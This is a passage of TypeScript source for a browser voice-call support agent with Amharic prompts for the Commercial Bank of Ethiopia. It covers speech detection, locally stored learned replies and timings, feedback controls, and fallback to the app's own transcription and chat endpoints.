        this.isListening = false;
        this.events.onUserSpeakingChange?.(false);
        this.events.onMicVolume?.(0);

        const stopMoment = Date.now();
        const historyBeforeTurn = [...this.history];
        const speakDurationMs =
          firstSpeechTime > 0
            ? Math.max(250, lastSpeechPeakTime - firstSpeechTime)
            : Math.max(350, stopMoment - turnStartTime - 450);
        const pauseBeforeSendMs =
          lastSpeechPeakTime > 0 ? Math.max(250, stopMoment - lastSpeechPeakTime) : 900;
        const totalTurnMs = Math.max(450, stopMoment - turnStartTime);
        const avgVoicePeak = peakFrames > 0 ? Math.round(peakSum / peakFrames) : 28;

        const saveLearnedTurnToLocalStorage = (spokenText: string) => {
          if (!wasTriggeredByUser && !hasSpoken) return;
          // In Training Mode (!this.isTestMode), save if not already saved via "💾 መዝግብ" (or if user spoke again after "💾 መዝግብ")
          if (!this.isTestMode && (!alreadySavedViaMezegeb || hasSpoken)) {
            recordLearnedTurnTimingAndUtterance({
              history: historyBeforeTurn,
              speakDurationMs,
              pauseBeforeSendMs,
              totalTurnMs,
              avgVoicePeak,
              burstCount: Math.max(1, burstCount),
              voiceSignature: getNormalizedVoiceSignature(),
              noiseFloor: Math.round(rollingNoiseFloor),
              utteranceText: spokenText,
            });
          }
          this.events.onLearningUpdate?.(getLocalLearningSummary(this.history));
        };

        // Helper to execute instant LocalStorage trained brain turn without network wait
        const runInstantLocalBrainTurn = async () => {
          const localTranscribed = inferLocalCallerTurn(this.history);

          // Check if a custom Support Agent is selected with populated steps
          const populatedSteps = getPopulatedSupportAgentSteps(this.selectedSupportAgentId);
          if (this.selectedSupportAgentId !== 'support_edris' && populatedSteps.length > 0) {
            saveLearnedTurnToLocalStorage(localTranscribed);
            this.events.onTranscriptUpdate?.('user', localTranscribed);
            this.history.push({ role: 'user', text: localTranscribed });

            if (this.customSupportStepCursor >= populatedSteps.length) {
              this.events.onTurnPhaseChange?.('idle');
              this.events.onStatusChange?.(
                `✅ የተጫኑት ${populatedSteps.length} Steps ተጠናቀዋል!`
              );
              return true;
            }

            const nextStep = populatedSteps[this.customSupportStepCursor];
            this.customSupportStepCursor += 1;
            await new Promise((r) => setTimeout(r, 120));
            this.history.push({
              role: 'model',
              text: nextStep.title,
              audioUrl: nextStep.blobUrl,
            });
            this.events.onLearningUpdate?.(getLocalLearningSummary(this.history));
            await this.handleAiReply(nextStep.title, null, nextStep.blobUrl, onResult);
            return true;
          }

          const localMatch = matchLocalTrainedResponse(localTranscribed, this.history);
          if (localMatch) {
            saveLearnedTurnToLocalStorage(localTranscribed);
            this.events.onTranscriptUpdate?.('user', localTranscribed);
            this.history.push({ role: 'user', text: localTranscribed });
            await new Promise((r) => setTimeout(r, 120));
            this.history.push({
              role: 'model',
              text: localMatch.replyText,
              audioUrl: localMatch.audioUrl,
            });
            this.events.onLearningUpdate?.(getLocalLearningSummary(this.history));
            await this.handleAiReply(localMatch.replyText, null, localMatch.audioUrl, onResult);
            return true;
          }
          return false;
        };

        // When Fast LocalStorage Mode is active (default), execute 100% locally on the phone with 0 network calls & 0 quota errors!
        if (this.useFastLocalMode && (wasTriggeredByUser || hasSpoken)) {
          const handled = await runInstantLocalBrainTurn();
          if (handled) return;
        }

        const audioBlob = new Blob(this.audioChunks, { type: selectedMime });
        if (audioBlob.size === 0) {
          if (wasTriggeredByUser && this.isCallActive && !this.isAgentSpeaking) {
            const handled = await runInstantLocalBrainTurn();
            if (handled) return;
          }
          if (this.isCallActive && !this.isAgentSpeaking) {
            this.startListening(onResult);
          }
          return;
        }

        const reader = new FileReader();
        reader.readAsDataURL(audioBlob);
        reader.onloadend = async () => {
          const resultStr = typeof reader.result === 'string' ? reader.result : '';
          const commaIdx = resultStr.indexOf(',');
          const base64Data = commaIdx !== -1 ? resultStr.substring(commaIdx + 1) : '';

          if (!base64Data || base64Data.length < 100) {
            if (wasTriggeredByUser && this.isCallActive && !this.isAgentSpeaking) {
              const handled = await runInstantLocalBrainTurn();
              if (handled) return;
            }
            if (this.isCallActive && !this.isAgentSpeaking) {
              this.startListening(onResult);
            }
            return;
          }

          // If offline or Fast Local Mode is enabled, race cloud with a fast 600ms timeout so weak internet never delays the call
          if (!navigator.onLine) {
            await runInstantLocalBrainTurn();
            return;
          }

          try {
            this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ በማሰብ ላይ...');

            const controller = new AbortController();
            const timeoutMs = this.useFastLocalMode ? 650 : 6000;
            const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

            const res = await fetch('/api/transcribe-and-reply', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                audioBase64: base64Data,
                mimeType: selectedMime,
                history: this.history,
              }),
              signal: controller.signal,
            });
            clearTimeout(timeoutId);

            const data = await res.json();
            if (data.replyText) {
              if (data.transcribedText) {
                saveLearnedTurnToLocalStorage(data.transcribedText);
                this.events.onTranscriptUpdate?.('user', data.transcribedText);
                this.history.push({ role: 'user', text: data.transcribedText });
                await new Promise((r) => setTimeout(r, 150));
              }
              this.history.push({ role: 'model', text: data.replyText, audioUrl: data.audioUrl });
              this.events.onLearningUpdate?.(getLocalLearningSummary(this.history));
              this.handleAiReply(data.replyText, data.audioBase64, data.audioUrl, onResult);
            } else {
              const handledLocally = await runInstantLocalBrainTurn();
              if (!handledLocally) this.startListening(onResult);
            }
          } catch (err) {
            // Network slow, aborted after 650ms, or disconnected -> instant LocalStorage brain response!
            const handledLocally = await runInstantLocalBrainTurn();
            if (!handledLocally) {
              this.startListening(onResult);
            }
          }
        };
      };

      // Real-time Human Voice vs Background Music/Noise discriminator + Self-Learned Timing VAD
      this.vadInterval = setInterval(() => {
        if (!this.isListening || isStopping) return;
        if (this.isMuted) {
          this.events.onUserSpeakingChange?.(false);
          this.events.onMicVolume?.(0);
          return;
        }
        voiceAnalyser.getByteFrequencyData(voiceData);
        rawAnalyser.getByteFrequencyData(rawData);

        // 1. Measure Human Speech Band (300Hz - 3000Hz: bins 2 to 22)
        let maxVoicePeak = 0;
        let voiceSum = 0;
        for (let i = 2; i <= 22; i++) {
          const val = voiceData[i];
          if (val > maxVoicePeak) maxVoicePeak = val;
          voiceSum += val;
        }
        const voiceAvg = voiceSum / 21;

        // 2. Measure Non-Vocal Music Bass & High Treble (bins 0-1 and bins 30-60)
        const bassEnergy = (rawData[0] + rawData[1]) / 2;
        let highMusicSum = 0;
        for (let i = 30; i <= 55; i++) {
          highMusicSum += rawData[i];
        }
        const highMusicAvg = highMusicSum / 26;

        // Auto-calibrate baseline room noise floor so ambient room sound never locks isHumanSpeech=true
        frameCount++;
        if (frameCount <= 3) {
          rollingNoiseFloor = voiceAvg;
        } else if (voiceAvg < rollingNoiseFloor) {
          rollingNoiseFloor = rollingNoiseFloor * 0.55 + voiceAvg * 0.45;
        } else {
          rollingNoiseFloor = rollingNoiseFloor * 0.975 + voiceAvg * 0.025;
        }

        // Human voice has strong energy in 300Hz-3000Hz above the steady background floor,
        // and is not dominated purely by sub-bass/cymbal music
        const dynamicPeakThreshold = Math.max(9, rollingNoiseFloor + 6);
        const isMusicDominated = bassEnergy > maxVoicePeak * 1.65 && highMusicAvg > voiceAvg * 1.2;
        const isHumanSpeech =
          frameCount > 2 &&
          !isMusicDominated &&
          (maxVoicePeak > dynamicPeakThreshold || voiceAvg > rollingNoiseFloor + 4);

        const volPercent = isHumanSpeech
          ? Math.min(100, Math.round((maxVoicePeak / 128) * 100))
          : Math.min(15, Math.round((voiceAvg / 128) * 40));
        this.events.onMicVolume?.(volPercent);

        if (isHumanSpeech) {
          const now = Date.now();
          if (!hasSpoken) {
            firstSpeechTime = now;
            burstCount = 1;
          } else if (!wasSpeakingLastFrame && now - lastSpeechPeakTime > 150) {
            burstCount++;
          }
          wasSpeakingLastFrame = true;
          hasSpoken = true;
          alreadySavedViaMezegeb = false;
          lastSpeechPeakTime = now;
          silenceStart = now;
          peakSum += maxVoicePeak;
          peakFrames++;

          // Accumulate 8-band voice frequency signature (300Hz - 3000Hz) + Pitch Centroid for End-of-Turn Prosody
          let weightedBinSum = 0;
          let binEnergySum = 0;
          for (let b = 0; b < 8; b++) {
            const binIdx = 2 + b * 2;
            const bandEnergy = Math.round((voiceData[binIdx] + voiceData[binIdx + 1]) / 2);
            voiceSigAccum[b] += bandEnergy;
            weightedBinSum += (b + 1) * bandEnergy;
            binEnergySum += bandEnergy;
          }
          const currentCentroid = binEnergySum > 0 ? weightedBinSum / binEnergySum : 3.5;
          if (peakFrames <= 3) {
            initialPitchCentroid = currentCentroid;
          }
          latestPitchCentroid = latestPitchCentroid * 0.6 + currentCentroid * 0.4;

          const liveSpeakSec = Number(((now - firstSpeechTime) / 1000).toFixed(1));
          this.events.onLiveTimingUpdate?.({ speakSeconds: liveSpeakSec, pauseSeconds: 0 });
          this.events.onUserSpeakingChange?.(true);
        } else {
          wasSpeakingLastFrame = false;
          this.events.onUserSpeakingChange?.(false);

          const now = Date.now();
          const spokenSoFarMs = firstSpeechTime > 0 ? Math.max(200, lastSpeechPeakTime - firstSpeechTime) : 0;
          const silenceDurationMs = hasSpoken ? Math.max(0, now - silenceStart) : 0;

          // Live stopwatch when user tapped "🎓 አስተምር"
          if (this.teachTurnActiveStartMs > 0) {
            const elapsedTeachSec = Number(
              ((Date.now() - this.teachTurnActiveStartMs) / 1000).toFixed(1)
            );
            this.events.onLiveTimingUpdate?.({
              speakSeconds: elapsedTeachSec,
              pauseSeconds: Number((silenceDurationMs / 1000).toFixed(1)),
            });
          } else if (hasSpoken) {
            this.events.onLiveTimingUpdate?.({
              speakSeconds: Number((spokenSoFarMs / 1000).toFixed(1)),
              pauseSeconds: Number((silenceDurationMs / 1000).toFixed(1)),
            });
          }

          // In 🧪 Test Mode: use the selected Class (Class 1..10) timing!
          if (this.isTestMode && hasSpoken) {
            const classTiming = getStepTimingFromSelectedClass({
              selectedClassId: this.selectedClassId,
              history: this.history,
              liveSpeakDurationMs: spokenSoFarMs,
            });

            if (
              silenceDurationMs >= Math.max(150, classTiming.pauseBeforeSendMs - 450) &&
              silenceDurationMs < classTiming.pauseBeforeSendMs
            ) {
              this.events.onTurnPhaseChange?.('yellow');
            }

            if (silenceDurationMs >= classTiming.pauseBeforeSendMs) {
              this.events.onTurnPhaseChange?.('yellow');
              stopRecordingAndSend(true);
            }
          }
        }
      }, 80);

      // Generous 60 seconds recording safety limit
      this.recordTimeout = setTimeout(() => {
        if (hasSpoken) {
          stopRecordingAndSend(true);
        }
      }, 60000);

      this.mediaRecorder.start(200);
      if (this.isTestMode) {
        this.scheduleSelectedClassTestTimer();
      }
      this.events.onMicPermissionDenied?.(false);
    } catch (micErr) {
      this.isListening = false;
      console.warn('Mic access permission not granted yet:', micErr);
      this.events.onMicPermissionDenied?.(true);
      this.events.onStatusChange?.('የማይክሮፎን ፈቃድ አልተሰጠም');
      if (this.isTestMode && this.isCallActive && !this.isAgentSpeaking) {
        this.scheduleSelectedClassTestTimer();
      }
    }
  }

  // Record pattern only ("💾 መዝግብ" button in "🎓 አስተምር" mode) without advancing to next step yet
  savePatternOnly(customText?: string) {
    if (this.savePatternOnlyFn) {
      this.savePatternOnlyFn(customText);
    } else {
      const spokenText = customText?.trim() || inferLocalCallerTurn(this.history);
      recordLearnedTurnTimingAndUtterance({
        history: [...this.history],
        speakDurationMs: 1800,
        pauseBeforeSendMs: 1100,
        totalTurnMs: 2900,
        avgVoicePeak: 30,
        burstCount: 3,
        noiseFloor: 6,
        utteranceText: spokenText,
      });
      const summary = getLocalLearningSummary(this.history);
      this.events.onLearningUpdate?.(summary);
      this.events.onStatusChange?.(
        `✅ መንገድ #${summary.currentStepSamples} በ LocalStorage ተመዘገበ!`
      );
    }
  }

  // Reinforcement Learning Feedback ("🐢 ፈጠንክ" / "👍 ልክ ነው" / "⚡ ዘገየህ")
  giveFeedback(feedback: 'too_fast' | 'good' | 'too_slow') {
    const res = applyReinforcementFeedback({
      history: this.history,
      feedback,
      patternIndex: this.lastMatchedPatternIdx,
    });
    const summary = getLocalLearningSummary(this.history);
    this.events.onLearningUpdate?.(summary);
    this.events.onStatusChange?.(res.message);
  }

  // Manually finish speaking (user pressed "✓ ላክ")
  finishSpeakingManually() {
    if (this.stopRecordingFn) {
      const stopFn = this.stopRecordingFn;
      this.stopRecordingFn = null;
      stopFn();
    } else if (this.currentSpeechTranscript.trim().length > 0 && this.onResultCallback) {
      const text = this.currentSpeechTranscript.trim();
      this.stopListening();
      this.onResultCallback(text);
    } else if (this.isCallActive && !this.isAgentSpeaking) {
      // Instant LocalStorage Trained Brain advance when user taps "✓ ላክ"
      const localText = inferLocalCallerTurn(this.history);
      this.stopListening();
      this.processUserMessage(localText, this.onResultCallback || (() => {}));
    }
  }

  // Explicit user-triggered permission request
  async requestMicPermission(): Promise<boolean> {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      stream.getTracks().forEach((t) => t.stop());
      this.events.onMicPermissionDenied?.(false);
      this.events.onStatusChange?.('ማይክሮፎን ተፈቅዷል');
      return true;
    } catch (err) {
      console.warn('Microphone permission request error:', err);
      this.events.onMicPermissionDenied?.(true);
      return false;
    }
  }

  stopListening() {
    this.isListening = false;
    this.events.onUserSpeakingChange?.(false);
    if (this.vadInterval) {
      clearInterval(this.vadInterval);
      this.vadInterval = null;
    }
    if (this.recordTimeout) {
      clearTimeout(this.recordTimeout);
      this.recordTimeout = null;
    }
    if (this.testModeTimer) {
      clearTimeout(this.testModeTimer);
      this.testModeTimer = null;
    }
    if (this.yellowDotTimer) {
      clearTimeout(this.yellowDotTimer);
      this.yellowDotTimer = null;
    }
    if (this.silenceTimer) {
      clearTimeout(this.silenceTimer);
      this.silenceTimer = null;
    }
    if (this.recognition) {
      try {
        this.recognition.stop();
      } catch (e) {
        // ignore
      }
      this.recognition = null;
    }
    if (this.mediaRecorder && this.mediaRecorder.state !== 'inactive') {
      try {
        this.mediaRecorder.stop();
      } catch (e) {
        // ignore
      }
    }
  }

  // Process text conversation turn with LocalStorage Brain first (0ms delay), then Gemini fallback
  async processUserMessage(userText: string, onNextTurn: (text: string) => void) {
    if (!this.isCallActive) return;

    const historyBeforeUser = [...this.history];
    recordLearnedUtteranceOnly(historyBeforeUser, userText);
    this.history.push({ role: 'user', text: userText });
    this.events.onTranscriptUpdate?.('user', userText);

    // 0. If custom Support Agent is selected with populated steps, play them in order and stop when finished!
    const populatedSteps = getPopulatedSupportAgentSteps(this.selectedSupportAgentId);
    if (this.selectedSupportAgentId !== 'support_edris' && populatedSteps.length > 0) {
      if (this.customSupportStepCursor >= populatedSteps.length) {
        this.events.onTurnPhaseChange?.('idle');
        this.events.onStatusChange?.(
          `✅ የተጫኑት ${populatedSteps.length} Steps ተጠናቀዋል!`
        );
        return;
      }
      const nextStep = populatedSteps[this.customSupportStepCursor];
      this.customSupportStepCursor += 1;
      this.history.push({
        role: 'model',
        text: nextStep.title,
        audioUrl: nextStep.blobUrl,
      });
      this.events.onLearningUpdate?.(getLocalLearningSummary(this.history));
      await new Promise((r) => setTimeout(r, 120));
      await this.handleAiReply(nextStep.title, null, nextStep.blobUrl, onNextTurn);
      return;
    }

    // 1. Instant LocalStorage Trained Brain check (0ms network delay!)
    const localMatch = matchLocalTrainedResponse(userText, historyBeforeUser);
    if (localMatch) {
      this.history.push({
        role: 'model',
        text: localMatch.replyText,
        audioUrl: localMatch.audioUrl,
      });
      this.events.onLearningUpdate?.(getLocalLearningSummary(this.history));
      await new Promise((r) => setTimeout(r, 120));
      await this.handleAiReply(localMatch.replyText, null, localMatch.audioUrl, onNextTurn);
      return;
    }

    // 2. Fallback to server Gemini for out-of-scope custom banking questions
    this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ በማሰብ ላይ...');

    try {
      const response = await fetch('/api/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: userText,
          history: historyBeforeUser,
        }),
      });

      const data = await response.json();
      const reply = data.replyText || 'የኢትዮጵያ ንግድ ባንክ፤ እባክዎትን ጥያቄዎን በድጋሚ ይንገሩኝ?';
      this.history.push({ role: 'model', text: reply, audioUrl: data.audioUrl });

      await new Promise((r) => setTimeout(r, 200));
      await this.handleAiReply(reply, data.audioBase64, data.audioUrl, onNextTurn);
    } catch (err: any) {
      console.error('Chat error:', err);
      const fallbackReply = 'ይቅርታ ደንበኛችን፣ የመስመር መቆራረጥ አጋጥሟል። እባክዎትን ጥያቄዎን ደግመው ያሰሙን።';
      await this.speakAgent(fallbackReply);
      if (this.isCallActive) {
        this.startListening(onNextTurn);
      }
    }
  }

  // Handle AI reply playback and automatically reopen mic
  private async handleAiReply(
    replyText: string,
    audioBase64: string | null,
    audioUrl: string | null | undefined,
    onNextTurn: (text: string) => void
  ) {
    if (!this.isCallActive) return;

    // Brief YELLOW phase ("አውርተህ ጨርሰሃል ዝም በል — እድሪስ ሊያወራ ነው") right before Agent speaks
    this.events.onTurnPhaseChange?.('yellow');
    await new Promise((r) => setTimeout(r, 320));
    if (!this.isCallActive) return;

    this.isAgentSpeaking = true;
    this.events.onAgentSpeakingChange?.(true);
    this.events.onTurnPhaseChange?.('green');
    this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ እየመለሰ ነው...');
    this.events.onTranscriptUpdate?.('agent', replyText);

    if (audioUrl) {
      try {
        const resolvedUrl = resolveSupportAgentAudioUrl(
          this.selectedSupportAgentId,
          audioUrl
        );
        await phoneAudio.playAudioFile(resolvedUrl);
      } catch (e) {
        console.warn('Playing audioUrl failed:', e);
      }
    } else if (audioBase64) {
      try {
        await phoneAudio.playBase64Audio(audioBase64);
      } catch (e) {
        console.warn('Playing audio base64 failed, falling back:', e);
        await phoneAudio.speakFallback(replyText);
      }
    } else {
      await phoneAudio.speakFallback(replyText);
    }

    this.isAgentSpeaking = false;
    this.events.onAgentSpeakingChange?.(false);

    const populatedSteps = getPopulatedSupportAgentSteps(this.selectedSupportAgentId);
    if (
      this.selectedSupportAgentId !== 'support_edris' &&
      populatedSteps.length > 0 &&
      this.customSupportStepCursor >= populatedSteps.length
    ) {
      this.events.onTurnPhaseChange?.('idle');
      this.events.onStatusChange?.(
        `✅ ሁሉም የተጫኑ ${populatedSteps.length} Steps ተጫውተው አልቀዋል!`
      );
      return;
    }

    // Automatically resume listening hands-free ONLY AFTER audio playback finishes completely!
    if (this.isCallActive) {
      this.startListening(onNextTurn);
    }
  }
}
